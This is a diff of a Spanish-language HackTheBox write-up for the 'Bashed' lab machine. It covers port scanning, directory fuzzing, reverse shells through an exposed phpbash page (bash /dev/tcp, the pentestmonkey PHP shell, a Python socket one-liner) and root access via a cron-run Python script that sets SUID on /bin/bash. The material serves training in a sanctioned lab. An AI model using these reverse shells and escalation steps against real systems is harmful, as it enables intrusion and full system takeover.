@@ -10,20 +10,32 @@ header:
   icon: /assets/images/hackthebox.webp
 categories:
   - HackTheBox
+  - Easy Machine
 tags:
   - Linux
   - Fuzzing
-  - Web Bash Shell
+  - WebShell Bash
   - Reverse Shell
-  - Terminal Interactiva
   - Script Manager
-  - Python Exploitation
-  - SUDO Exploitation
+  - CronJob Exploitation
+  - Abusing Sudoers Privilege
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-bashed/bashed_logo.png)
 
-Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando **scriptmanager**, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario **scriptmanager** para escalar privilegios, usando un script en Python con él cambiaremos los permisos de la **Bash** para convertirnos en Root.
+Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo usar el comando **scriptmanager**, pero de ahí en fuera, todo fue fácil. Vamos a aprovecharnos de una subpágina que es una shell de bash como web, la cual vamos a usar para conectarnos de manera remota y en la cual, usaremos el usuario **scriptmanager** para escalar privilegios, usando un script en **Python** con él cambiaremos los permisos de la **Bash** para convertirnos en **Root**.
+
+Herramientas utilizadas:
+* *nmap*
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* *nc*
+* *wget*
+* *bash*
+* *python3*
+* *find*
+* *crontab*
 
 
 <br>
@@ -39,23 +51,25 @@ Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo 
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
 				<ul>
-                                        <li><a href="#Wfuzz">Fuzzing con wfuzz</a></li>
 					<li><a href="#NMAP">Fuzzing con NMAP</a></li>
                                 </ul>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#Bash">Utilizando Bash para Conectarnos de Manera Remota</a></li>
-				<li><a href="#Shell">Cargando una Reverse Shell</a></li>
-				<li><a href="#SSH">Enumeración Servicio SSH</a></li>
+				<li><a href="#RevShells">Ganando Acceso a la Máquina Víctima con Distintas Reverse Shell</a></li>
+				<ul>
+					<li><a href="#Bash">Utilizando Bash para Conectarnos de Manera Remota</a></li>
+					<li><a href="#Shell">Cargando una Reverse Shell</a></li>
+					<li><a href="#Python">Usando Reverse Shell de Python</a></li>
+				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#Terminal">Obteniendo una Terminal Interactiva</a></li>
-				<li><a href="#Root">Acceso como Root</a></li>
+				<li><a href="#SSH">Enumeración Servicio SSH</a></li>
+				<li><a href="#Root">Acceso como Root Usando Tarea Cron</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -77,7 +91,7 @@ Una máquina realmente sencilla, si acaso lo que costo un poquillo fue el cómo 
 <h2 id="Ping">Traza ICMP</h2>
 
 Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO utiliza la máquina.
-```
+```bash
 ping -c 4 10.10.10.68
 PING 10.10.10.68 (10.10.10.68) 56(84) bytes of data.
 64 bytes from 10.10.10.68: icmp_seq=1 ttl=63 time=129 ms
@@ -93,7 +107,7 @@ Gracias al TTL, sabemos que la máquina usa Linux. Hagamos los escaneos de puert
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.68 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:28 CST
@@ -113,20 +127,23 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 26.09 seconds
            Raw packets sent: 124306 (5.469MB) | Rcvd: 15355 (614.220KB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
 
 Solo hay un puerto abierto que ya conocemos, hagamos el escaneo de servicios para ver que nos dice.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p80 10.10.10.68 -oN targeted                              
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:52 CST
 Nmap scan report for 10.10.10.68
@@ -140,10 +157,13 @@ PORT   STATE SERVICE VERSION
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.93 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
 
 Solo nos menciona que usa el servicio **Apache**. Vamos a analizar la página.
 
@@ -160,9 +180,9 @@ Solo nos menciona que usa el servicio **Apache**. Vamos a analizar la página.
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
-Vamos a entrar.
+Vamos a entrar:
 
 ![](/assets/images/htb-writeup-bashed/Captura1.png)
 
@@ -176,7 +196,7 @@ Mmmmm no nos dice mucho, sigamos viendo la página. Hay una publicación de algu
 
 ![](/assets/images/htb-writeup-bashed/Captura3.png)
 
-Si investigamos el GitHub que nos menciona la publicación, podemos ver que es una herramienta de bash, usada en PHP. En resumen, podemos usar una bash dentro de la página web, usando cualquiera de los dos archivos que vienen en el GitHub. Ósea, **phpbash.php** o **phpbash.min.php**.
+Si investigamos el **GitHub** que nos menciona la publicación, podemos ver que es una herramienta que usa **Bash**, usada en **PHP**. En resumen, podemos usar una **terminal bash** dentro de la página web, usando cualquiera de los dos archivos que vienen en el **GitHub**. Ósea, **phpbash.php** o **phpbash.min.php**.
 
 ![](/assets/images/htb-writeup-bashed/Captura4.png)
 
@@ -184,11 +204,7 @@ Por lo que entiendo, la máquina está usando dicha herramienta, así que deber�
 
 <h2 id="Fuzz">Fuzzing</h2>
 
-Podemos hacer el **Fuzzing** de dos formas, con **wfuzz** y con **nmap**. Probemos los dos:
-
-<h3 id="Wfuzz">Fuzzing con wfuzz</h3>
-
-```
+```bash
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ/         
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -232,15 +248,59 @@ Processed Requests: 220560
 Filtered Requests: 220536
 Requests/sec.: 414.3847
 ```
-* -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el código de estado 404, hc = hide code.
-* -t: Para usar una cantidad específica de hilos.
-* -w: Para usar un diccionario de wordlist.
-* Diccionario que usamos: dirbuster
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
+
+Ahora, probemos con **Gobuster**:
+
+```bash
+gobuster dir -u http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.68/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
+/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
+/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
+/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
+/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
+/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
+/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
+/server-status        (Status: 403) [Size: 299]
+Progress: 220483 / 220561 (99.96%)
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+
+<br>
+
+Pues arrojo casi los mismos resultados, solo por curiosidad, veamos que nos dice **nmap** cuando apliquemos **fuzzing**.
 
 <h3 id="NMAP">Fuzzing con NMAP</h3>
 
-```
+```bash
 nmap --script http-enum -p80 -oN webScan 10.10.10.68
 Nmap 7.93 scan initiated Mon Apr 17 18:50:30 2023 as: nmap --script http-enum -p80 -oN webScan 10.10.10.68
 Nmap scan report for 10.10.10.68
@@ -259,11 +319,13 @@ PORT   STATE SERVICE
 Nmap done at Mon Apr 17 18:50:47 2023 -- 1 IP address (1 host up) scanned in 16.66 seconds
 ```
 
-Muy bien, hay varias subpáginas, pero en este caso me interesan 3, la de **php**, **uploads** y **dev**. Si tratamos de entrar a **php** y **uploads**, no encontraremos nada de interés, así que vámonos a la **dev**.
+Muy bien, hay varios directorios, pero en este caso me interesan 3, la de **php**, **uploads** y **dev**. 
+
+Si tratamos de entrar a **php** y **uploads**, no encontraremos nada de interés, así que vámonos a la **dev**.
 
 ![](/assets/images/htb-writeup-bashed/Captura5.png)
 
-A cualquiera de esos archivos que le demos click, nos va a mandar a una bash interactiva desde la web, pero como es muy lenta vamos a conectarnos de manera remota.
+A cualquiera de esos archivos que le demos click, nos va a mandar a una **bash interactiva** desde la web, pero como es muy lenta vamos a conectarnos de manera remota.
 
 
 <br>
@@ -277,26 +339,32 @@ A cualquiera de esos archivos que le demos click, nos va a mandar a una bash int
 </div>
 <br>
 
-Podemos hacer 2 cosas para tratar de conectarnos de manera remota, una sería usando un script en bash y la otra cargando una Reverse Shell en la carpeta **uploads** de la página.
 
-<h2 id="Bash">Utilizando Bash para Conectarnos de Manera Remota</h2>
+<h2 id="RevShells">Ganando Acceso a la Máquina Víctima con Distintas Reverse Shell</h2>
+
+Podemos hacer 2 cosas para tratar de conectarnos de manera remota, una sería usando un script en **bash** y la otra cargando una **Reverse Shell** en la carpeta **uploads** de la página.
+
+<br>
+
+<h3 id="Bash">Utilizando Bash para Conectarnos de Manera Remota</h3>
 
 Bueno, hagamoslo por pasos:
-* Alzamos una netcat:
-```
+* Alzamos una **netcat**:
+```bash
 nc -nvlp 443                              
 listening on [any] 443 ...
 ```
-* Vamos a usar el siguiente script:
-```
+
+* Vamos a usar el siguiente one-liner que es una **Reverse Shell**:
+```bash
 bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"
 ```
-PERO, vamos a **url encodearlo** cambiando los ampersands por **%26**. Una vez que lo hagas, dale enter y ya debería estar:
+PERO, vamos a **url encodearlo** cambiando los **ampersands (&)** por **%26**. Una vez que lo hagas, ejecutalo y ya debería estar:
 
 ![](/assets/images/htb-writeup-bashed/Captura6.png)
 
 * Y ya deberíamos estar conectados:
-```
+```bash
 nc -nvlp 443                                                    
 listening on [any] 443 ...
 connect to [10.10.14.16] from (UNKNOWN) [10.10.10.68] 45400
@@ -308,32 +376,61 @@ whoami
 www-data
 ```
 
-<h2 id="Shell">Cargando una Reverse Shell</h2>
+De una vez, vamos a obtener una sesión interactiva, sigue estos pasos:
 
-Recordemos 2 cosas, una que la página trabaja con PHP y que tiene una carpeta llamada **uploads**.
+* Escribe el siguiente comando:
+```bash
+script /dev/null -c bash
+```
+
+* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
+```bash
+zsh: suspended  nc -nvlp 443
+```
+
+* Ahora escribe el siguiente comando en tu máquina:
+```bash
+ stty raw -echo; fg       
+[1]  + continued  nc -nvlp 443
+```
+
+* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
+```bash
+[1]  + continued  nc -nvlp 443
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+```
+
+* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
+```bash
+www-data@bashed:/var/www/html/dev$ export TERM=xterm
+www-data@bashed:/var/www/html/dev$ export SHELL=bash
+www-data@bashed:/var/www/html/dev$ stty rows 51 columns 189
+```
+Y listo, ya tenemos nuestra terminal interactiva.
+
+<br>
+
+<h3 id="Shell">Cargando una Reverse Shell</h3>
+
+Recordemos 2 cosas, una que la página trabaja con **PHP** y que tiene una carpeta llamada **uploads**.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-bashed/Captura7.png">
 </p>
 
-Bien, ya conocemos una Reverse Shell de PHP, busquemos a **Pentestmonkey**:
+Bien, ya conocemos una **Reverse Shell** de **PHP**, busquemos a **Pentestmonkey**:
 * https://github.com/pentestmonkey/php-reverse-shell
 
 Ahora, hagamos todo por pasos:
-* Clonamos el GitHub:
-```
-git clone https://github.com/pentestmonkey/php-reverse-shell.git
-Clonando en 'php-reverse-shell'...
-remote: Enumerating objects: 10, done.
-remote: Counting objects: 100% (3/3), done.
-remote: Compressing objects: 100% (2/2), done.
-remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
-Recibiendo objetos: 100% (10/10), 9.81 KiB | 1.23 MiB/s, listo.
-Resolviendo deltas: 100% (2/2), listo.
+* Clonamos la **Reverse Shell** de **PHP**:
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
-* Modificamos la Reverse Shell con nuestra IP y un puerto:
-```
+* Modificamos la **Reverse Shell** con nuestra **IP** y un puerto:
+```bash
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = 'Pon Aqui Tu IP';  // CHANGE THIS
@@ -345,13 +442,15 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 ```
-* Levantamos un servidor en python en donde tenemos la Reverse:
-```
+
+* Levantamos un servidor en python en donde tenemos la **Reverse Shell**:
+```bash
 python3 -m http.server   
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-* Ahora en la página web, descargamos la Reverse:
-```
+
+* Ahora en la página web, descargamos la **Reverse Shell**:
+```bash
 wget Tu_IP:8000/php-reverse-shell.php
 ```
 
@@ -360,20 +459,65 @@ wget Tu_IP:8000/php-reverse-shell.php
 </p>
 
 * Bien, alzamos una netcat:
-```
+```bash
 nc -nvlp 443                                                    
 listening on [any] 443 ...
 ```
+
 * Cargamos la página:
 
 ![](/assets/images/htb-writeup-bashed/Captura9.png)
 
 Y ya deberíamos estar conectados.
 
+<br>
+
+<h3 id="Python">Usando Reverse Shell de Python</h3>
+
+Con **python**, podemos ganar acceso de manera remota si utilizamos un one-liner que usa sockets para estableces una conexión, entre nuestra máquina y la máquina víctima, PERO no es una sesión interactiva, es decir, que no podremos usar **nano**. 
+
+Nunca esta demás usar siempre otras alternativas. Vamos a hacerlo por pasos:
+
+* Alzamos una **netcat**:
+```bash
+nc -nvlp 443                              
+listening on [any] 443 ...
+```
+
+* Utiliza el siguiente one-liner de **Python** que es una **Reverse Shell**:
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Tu_IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+
+* Observa el resultado en la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.62] from (UNKNOWN) [10.10.10.68] 60532
+www-data@bashed:/var/www/html/dev$ whoami
+whoami
+www-data
+www-data@bashed:/var/www/html/dev$
+```
+Y con esto terminamos.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+ <h1 id="Post" style="text-align:center;">Post Explotación</h1>
+  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
+   <a href="#Indice">Volver al Índice</a>
+  </button>
+</div>
+<br>
+
+
 <h2 id="SSH">Enumeración Servicio SSH</h2>
 
 Bueno, como siempre buscamos el directorio **/home** para encontrar la flag del usuario.
-```
+```bash
 www-data@bashed:/var/www/html/dev$ cd /home
 www-data@bashed:/home$ ls -la
 total 16
@@ -396,22 +540,9 @@ drwxrwxr-x 2 arrexel arrexel 4096 Dec  4  2017 .nano
 -r--r--r-- 1 arrexel arrexel   33 Apr 17 14:24 user.txt
 www-data@bashed:/home/arrexel$ cat user.txt
 ```
-Listo, ahora vamos a escalar privilegios.
 
-
-<br>
-<br>
-<hr>
-<div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
-</div>
-<br>
-
-Veamos nuestros privilegios:
-```
+Listo, ahora veamos nuestros privilegios:
+```bash
 www-data@bashed:/home/arrexel$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@bashed:/home/arrexel$ sudo -l
@@ -421,18 +552,22 @@ Matching Defaults entries for www-data on bashed:
 User www-data may run the following commands on bashed:
     (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
-Mmmm no sé qué es eso de **scriptmanager**, vamos a buscar un poco. Encontré este link:
+
+Mmmm no sé qué es eso de **scriptmanager**, vamos a buscar un poco para ver de que se trata. 
+
+Encontré este link:
 * https://f1uffygoat.com/privesc/
 
 Vamos a entrar como **scriptmanager**:
-```
+```bash
 www-data@bashed:/home/arrexel$ sudo -u scriptmanager bash
 scriptmanager@bashed:/home/arrexel$ 
 scriptmanager@bashed:/home/arrexel$ whoami
 scriptmanager
 ```
+
 Pero aún no podemos hacer nada, pues si intentas usar comandos como **SUDO**, no vamos a poder hacer nada. ¿Qué podemos hacer entonces? Vamos a buscar que archivos podemos modificar:
-```
+```bash
 scriptmanager@bashed:/$ find / -type f -user scriptmanager 2>/dev/null
 /scripts/test.py
 /home/scriptmanager/.profile
@@ -446,8 +581,9 @@ scriptmanager@bashed:/$ find / -type f -user scriptmanager 2>/dev/null
 /proc/2374/task/2374/environ
 ...
 ```
+
 Veo algo curioso ahí, un archivo en Python dentro del directorio **scripts**, vamos a investigarlo:
-```
+```bash
 scriptmanager@bashed:/$ cd /scripts
 scriptmanager@bashed:/scripts$ ls -la
 total 16
@@ -456,8 +592,9 @@ drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
 -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
 -rw-r--r--  1 root          root            12 Apr 17 17:37 test.txt
 ```
+
 Mmmmmm hagamos un **cat** al contenido:
-```
+```bash
 scriptmanager@bashed:/scripts$ cat test.py 
 f = open("test.txt", "w")
 f.write("testing 123!")
@@ -465,55 +602,38 @@ f.close
 scriptmanager@bashed:/scripts$ cat test.txt 
 testing 123!
 ```
-Quiero pensar, que el script de Python se ejecuta automáticamente (porque no me explico como es que genero el archivo de texto), entonces debemos aprovecharnos de eso, PERO no podremos hacerlo con esta terminal, así que hagámosla más interactiva.
+Quiero pensar, que el script de **Python** se ejecuta automáticamente como una **tarea cron**, entonces debemos aprovecharnos de eso.
 
-<h2 id="Terminal">Obteniendo una Terminal Interactiva</h2>
+<h2 id="Root">Acceso como Root Usando Tarea Cron</h2>
 
-Hagamos por pasos la obtención de la terminal interactiva:
-* Escribe el siguiente comando:
-```
-script /dev/null -c bash
-```
-* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
-```
-zsh: suspended  nc -nvlp 443
-```
-* Ahora escribe el siguiente comando en tu máquina:
-```
- stty raw -echo; fg       
-[1]  + continued  nc -nvlp 443
-```
-* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
-```
-[1]  + continued  nc -nvlp 443
-                              reset
-reset: unknown terminal type unknown
-Terminal type? xterm
-```
-* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
-```
-www-data@bashed:/var/www/html/dev$ export TERM=xterm
-www-data@bashed:/var/www/html/dev$ export SHELL=bash
-www-data@bashed:/var/www/html/dev$ stty rows 51 columns 189
-```
-Y listo, ya tenemos nuestra terminal interactiva.
+Ahora, sabemos que podemos usar **nano** dentro la máquina víctima, vamos a modificar el script de **Python** para que modifique los permisos de la **bash**, para que cualquier usuario pueda entrar como **Root**. 
 
-<h2 id="Root">Acceso como Root</h2>
-
-Ahora que ya podemos usar nano dentro la máquina víctima, vamos a modificar el script de Python para que modifique los permisos de la bash. Como soy retrasado y se me olvido checar los permisos de la bash, chécalo tú para que veas el cambio.
-Bien, borra el contenido del script y pon lo siguiente:
+* Revisa los permisos de la bash:
+```bash
+scriptmanager@bashed:/scripts$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
 ```
+
+* Opción 1 - borra el contenido del script y pon lo siguiente:
+```python
 import os
 
 chmod u+s /bin/bash
 ```
-Excelente, una vez que guardes y cierres, revisa los permisos de la bash:
+
+* Opción 2 - crea un script aparte con el mismo código que creamos en la opción 1:
+```bash
+echo "import os; os.system('chmod u+s /bin/bash');" > exploit.py
 ```
+
+* Excelente, una vez que guardes y cierres o que hayas usado la opción 2, revisa los permisos de la **bash**:
+```bash
 scriptmanager@bashed:/scripts$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
 ```
-Ufff yasta, escala privilegios perro del mal:
-```
+
+Listo, entra a la **bash** como **Root**:
+```bash
 scriptmanager@bashed:/scripts$ bash -p
 bash-4.3# whoami
 root
@@ -531,6 +651,14 @@ drwxr-xr-x  2 root root 4096 Jun  2  2022 .nano
 bash-4.3# cat root.txt
 ```
 
+Excelente, ya solamente revisemos si fue una **tarea cron** la que nos ayudo a ganar acceso:
+```bash
+bash-4.3# crontab -l
+* * * * * cd /scripts; for f in *.py; do python "$f"; done
+```
+Y si, con esto terminamos esta máquina.
+
+
 <br>
 <br>
 <div style="position: relative;">
@@ -539,6 +667,7 @@ bash-4.3# cat root.txt
    <a href="#Indice">Volver al Índice</a>
   </button>
 </div>
+
 
 * https://f1uffygoat.com/privesc/
 * https://www.revshells.com/
